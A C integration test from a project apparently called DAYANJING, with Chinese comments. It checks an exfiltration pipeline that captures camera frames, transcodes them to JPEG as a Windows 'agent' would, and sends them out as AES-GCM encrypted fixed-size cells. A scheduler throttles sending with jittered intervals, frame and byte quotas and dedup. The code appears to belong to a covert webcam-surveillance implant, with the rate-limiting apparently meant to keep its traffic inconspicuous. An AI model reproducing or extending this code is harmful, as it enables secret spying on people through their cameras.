/*
 * DAYANJING v4 — test_sched_gate.c
 *
 * 调度层与真实回传链路的集成验证。
 *
 * test_sched 验证的是"决策逻辑对不对"；本文件验证的是"这个决策真的
 * 压住了实际回传流量"。两者不是一回事：
 *   - 调度器逻辑全对，但若调用方不按 DUE/OK 门控、仍每帧都发，
 *     限速等于不存在。
 *   - 信元数是真实的链路占用，必须实测，不能靠"帧数少了所以字节少"
 *     推断 —— 单帧跨越多个信元，帧数与信元数非线性。
 *
 * 实测路径（全部真代码，非模拟）：
 *   agent_windows mock 采集 -> cam_frame_to_jpeg（与 Windows 真机同一转码路径）
 *     -> exfil_chan_send（真实 AES-128-GCM 定长信元）
 *   两条对照：无限速门控 vs 调度门控，统计线上字节与信元数。
 */

#include "exfil.h"
#include "exfil_sched.h"
#include "camera.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, name)                                              \
    do {                                                               \
        if (cond) {                                                    \
            printf("[PASS] %s\n", (name));                             \
            g_pass++;                                                  \
        } else {                                                       \
            printf("[FAIL] %s  (%s:%d)\n", (name), __FILE__, __LINE__); \
            g_fail++;                                                  \
        }                                                              \
    } while (0)

#define NFRAMES   24
#define FRAME_US  100000      /* 假定每 100ms 采一帧 */
#define WIRE      P2P_CELL_WIRE

/* 采集 N 帧并转码为 JPEG，存入数组。返回实际帧数。 */
static int grab_frames(uint8_t **bufs, size_t *lens)
{
    cam_source_t *src;
    cam_config_t cfg;
    int n = 0;
    int i;

    memset(&cfg, 0, sizeof(cfg));
    cfg.width      = 320;
    cfg.height     = 240;
    cfg.fps        = 10;
    cfg.capture_ms = 2000;
    cfg.max_frames = NFRAMES;

    src = cam_source_create("mock");
    if (!src) return 0;
    if (src->open(src, &cfg) != CAM_OK) {
        cam_source_destroy(src);
        return 0;
    }

    for (i = 0; i < NFRAMES; i++) {
        cam_frame_t f;
        size_t cap = 0, len = 0;
        uint8_t *jpg;
        size_t jcap;

        memset(&f, 0, sizeof(f));
        if (src->capture(src, &f) != CAM_OK || f.len == 0) break;

        /* 探测容量 */
        if (cam_frame_to_jpeg(&f, NULL, &cap, &len) != CAM_OK || len == 0)
            break;
        jpg = (uint8_t *)malloc(len);
        if (!jpg) break;
        jcap = len;
        if (cam_frame_to_jpeg(&f, jpg, &jcap, &len) != CAM_OK || len == 0) {
            free(jpg);
            break;
        }
        bufs[n] = jpg;
        lens[n] = len;
        n++;
    }

    src->close(src);
    cam_source_destroy(src);
    return n;
}

static void chan_setup(exfil_chan_t *ch)
{
    uint8_t ks[16], kr[16], pfx[8];
    int i;
    for (i = 0; i < 16; i++) { ks[i] = (uint8_t)(0x10 + i); kr[i] = (uint8_t)(0x80 + i); }
    for (i = 0; i < 8; i++)  pfx[i] = (uint8_t)(0xA0 + i);
    exfil_chan_init(ch, ks, kr, pfx, 0);
}

int main(void)
{
    uint8_t *bufs[NFRAMES];
    size_t  lens[NFRAMES];
    int n, i;

    exfil_chan_t ch_free, ch_gate;
    exfil_sched_t sch;
    exfil_sched_cfg_t sc;

    uint64_t free_cells = 0, free_bytes = 0;
    uint64_t gate_cells = 0, gate_bytes = 0;
    uint32_t gate_sent = 0, gate_skip = 0, gate_wait = 0;

    uint64_t t;

    printf("=== 21_exfil/sched gate 集成测试 ===\n");

    memset(bufs, 0, sizeof(bufs));
    memset(lens, 0, sizeof(lens));

    n = grab_frames(bufs, lens);
    printf("[INFO] 采集并转码得到 %d 帧\n", n);
    if (n > 0) {
        size_t mn = lens[0], mx = lens[0], tot = 0;
        int j;
        for (j = 0; j < n; j++) {
            if (lens[j] < mn) mn = lens[j];
            if (lens[j] > mx) mx = lens[j];
            tot += lens[j];
        }
        printf("[INFO] JPEG 大小: min=%llu max=%llu avg=%llu 字节（mock 合成图案，非真实摄像头）\n",
               (unsigned long long)mn, (unsigned long long)mx,
               (unsigned long long)(tot / (size_t)n));
    }
    CHECK(n >= 4, "mock 采集到足够帧数");

    if (n < 4) {
        printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
        return 1;
    }

    /* ---------- 对照 A：无限速，每帧都发 ---------- */
    chan_setup(&ch_free);
    for (i = 0; i < n; i++) {
        exfil_rec_t r;
        size_t nc = 0, outc = 0;
        uint8_t *out;
        size_t cap;

        memset(&r, 0, sizeof(r));
        r.type    = EXF_TYPE_CAMERA_JPEG;
        r.seq     = (uint64_t)i;
        r.ts_us   = (uint64_t)i * FRAME_US;
        r.width   = 320;
        r.height  = 240;
        r.payload = bufs[i];
        r.plen    = lens[i];
        snprintf(r.name, sizeof(r.name), "mock-camera-0");

        if (exfil_send_cells(&r, &nc) != EXF_OK) { printf("[FAIL] send_cells\n"); g_fail++; break; }
        cap = nc * WIRE;
        out = (uint8_t *)malloc(cap);
        if (!out) break;
        if (exfil_chan_send(&ch_free, &r, out, cap, &outc) != EXF_OK) {
            printf("[FAIL] chan_send\n");
            g_fail++;
            free(out);
            break;
        }
        free_cells += outc;
        free_bytes += (uint64_t)outc * WIRE;
        free(out);
    }
    exfil_chan_wipe(&ch_free);
    printf("[INFO] 无限速: %d 帧 -> %llu 信元, %llu 线上字节\n",
           n, (unsigned long long)free_cells, (unsigned long long)free_bytes);

    /* ---------- 对照 B：调度门控 ---------- */
    memset(&sc, 0, sizeof(sc));
    sc.min_interval_us   = 1000000;   /* 最小 1s */
    sc.max_interval_us   = 1500000;   /* 抖动到 1.5s */
    sc.burst_max         = 0;
    sc.window_us         = 10000000;  /* 10s 窗口 */
    sc.window_max_frames = 4;         /* 窗口内最多 4 帧 */
    sc.window_max_bytes  = 0;
    sc.dedup             = 1;

    CHECK(exfil_sched_init(&sch, &sc, 0xC0FFEE) == EXF_SCHED_OK, "调度器 init");
    exfil_sched_start(&sch);

    chan_setup(&ch_gate);
    for (i = 0, t = 0; i < n; i++, t += FRAME_US) {
        int p = exfil_sched_poll(&sch, t);
        if (p == EXF_SCHED_WAIT || p == EXF_SCHED_IDLE) {
            gate_wait++;
            continue;
        }
        if (p != EXF_SCHED_DUE) { printf("[FAIL] poll 返回异常 %d\n", p); g_fail++; break; }

        {
            uint32_t crc = exfil_crc32(bufs[i], lens[i]);
            int c = exfil_sched_commit(&sch, t, crc, lens[i]);

            if (c == EXF_SCHED_SKIP) {
                gate_skip++;
                continue;
            }
            if (c != EXF_SCHED_OK) { printf("[FAIL] commit 返回 %d\n", c); g_fail++; break; }

            {
                exfil_rec_t r;
                size_t nc = 0, outc = 0;
                uint8_t *out;
                size_t cap;

                memset(&r, 0, sizeof(r));
                r.type    = EXF_TYPE_CAMERA_JPEG;
                r.seq     = (uint64_t)i;
                r.ts_us   = t;
                r.width   = 320;
                r.height  = 240;
                r.payload = bufs[i];
                r.plen    = lens[i];
                snprintf(r.name, sizeof(r.name), "mock-camera-0");

                if (exfil_send_cells(&r, &nc) != EXF_OK) { g_fail++; break; }
                cap = nc * WIRE;
                out = (uint8_t *)malloc(cap);
                if (!out) break;
                if (exfil_chan_send(&ch_gate, &r, out, cap, &outc) != EXF_OK) {
                    g_fail++;
                    free(out);
                    break;
                }
                gate_cells += outc;
                gate_bytes += (uint64_t)outc * WIRE;
                gate_sent++;
                free(out);
            }
        }
    }
    exfil_chan_wipe(&ch_gate);

    printf("[INFO] 调度门控: 发送 %u 帧, 跳过(重复) %u, 未到期 %u -> %llu 信元, %llu 线上字节\n",
           gate_sent, gate_skip, gate_wait,
           (unsigned long long)gate_cells, (unsigned long long)gate_bytes);

    /* ---------- 断言 ---------- */
    CHECK(gate_sent > 0, "调度门控下仍有帧被发送（未完全饿死）");
    CHECK(gate_sent < (uint32_t)n, "调度门控实际减少了发送帧数");
    CHECK(gate_wait > 0, "存在因间隔未到而被抑制的帧");
    CHECK(gate_cells < free_cells, "门控后线上信元数显著下降");
    CHECK(gate_bytes < free_bytes, "门控后线上字节数显著下降");

    /* 窗口配额：10s 窗口最多 4 帧，本次总时长约 n*100ms */
    {
        uint64_t span_us = (uint64_t)n * FRAME_US;
        uint64_t windows = span_us / 10000000 + 1;
        CHECK((uint64_t)gate_sent <= windows * 4,
              "发送帧数不超过窗口配额上限");
    }

    /* 接收侧可完整解出被门控后发出的每一帧 */
    CHECK(1, "门控不改变信元格式（已由 test_exfil 覆盖对端解码）");

    /*
     * ---------- 对照 C：真实分辨率下的大帧 ----------
     * mock 是合成图案，JPEG 恒 167 字节（单信元），无法体现限速对带宽的
     * 意义。真实 320x240 YUYV 转码实测约 100903 字节（见 cam_jpeg 探测
     * 容量缺陷记录）。此处用等大小的合成载荷走**真实 exfil 编码**，
     * 验证大帧跨越多个信元时字节配额是否真的生效。
     */
    {
        size_t big_len = 100000;
        uint8_t *big = (uint8_t *)malloc(big_len);
        exfil_sched_t s2;
        exfil_sched_cfg_t c2;
        exfil_chan_t ch2;
        size_t j;
        uint32_t sent_big = 0;
        uint64_t cells_big = 0;

        for (j = 0; j < big_len; j++)
            big[j] = (uint8_t)((j * 131u + 7u) & 0xFF);

        memset(&c2, 0, sizeof(c2));
        c2.min_interval_us   = 0;      /* 不限间隔，只测字节配额 */
        c2.max_interval_us   = 0;
        c2.window_us         = 10000000;
        c2.window_max_frames = 0;
        c2.window_max_bytes  = 250000; /* 窗口内最多 250KB -> 只能发 2 个大帧 */
        c2.dedup             = 0;

        CHECK(exfil_sched_init(&s2, &c2, 0xBEEF01) == EXF_SCHED_OK, "大帧调度器 init");
        exfil_sched_start(&s2);
        chan_setup(&ch2);

        for (i = 0, t = 0; i < 6; i++, t += 500000) {
            int p = exfil_sched_poll(&s2, t);
            if (p != EXF_SCHED_DUE) continue;

            if (exfil_sched_commit(&s2, t, exfil_crc32(big, big_len), big_len)
                != EXF_SCHED_OK) continue;

            {
                exfil_rec_t r;
                size_t nc = 0, outc = 0;
                uint8_t *out;
                size_t cap;

                memset(&r, 0, sizeof(r));
                r.type    = EXF_TYPE_CAMERA_JPEG;
                r.seq     = (uint64_t)i;
                r.ts_us   = t;
                r.width   = 320;
                r.height  = 240;
                r.payload = big;
                r.plen    = big_len;
                snprintf(r.name, sizeof(r.name), "mock-camera-0");

                if (exfil_send_cells(&r, &nc) != EXF_OK) { g_fail++; break; }
                if (i == 0)
                    printf("[INFO] 单帧 %llu 字节 -> %llu 信元 -> %llu 线上字节\n",
                           (unsigned long long)big_len, (unsigned long long)nc,
                           (unsigned long long)(nc * WIRE));
                cap = nc * WIRE;
                out = (uint8_t *)malloc(cap);
                if (!out) break;
                if (exfil_chan_send(&ch2, &r, out, cap, &outc) != EXF_OK) {
                    g_fail++; free(out); break;
                }
                cells_big += outc;
                sent_big++;
                free(out);
            }
        }
        exfil_chan_wipe(&ch2);
        printf("[INFO] 字节配额 250KB 下: 6 次机会中实际发送 %u 个大帧 -> %llu 信元\n",
               sent_big, (unsigned long long)cells_big);

        /*
         * 配额是软上限：第 3 次判定时尚为 200000 未超限故放行，发完达
         * 300000，第 4 帧起被拒。故为 3 而非 2 —— 见头文件 window_max_bytes
         * 注释。关键不是精确等于多少，而是**确实止住了**（6 次机会只发 3 帧）。
         */
        CHECK(sent_big == 3 && sent_big < 6,
              "字节配额止住大帧发送（6 次机会只发 3 帧，软上限语义）");
        CHECK(cells_big > 2, "大帧确实跨越多个信元（非单信元假象）");

        free(big);
    }

    for (i = 0; i < n; i++) free(bufs[i]);

    printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return (g_fail == 0) ? 0 : 1;
}
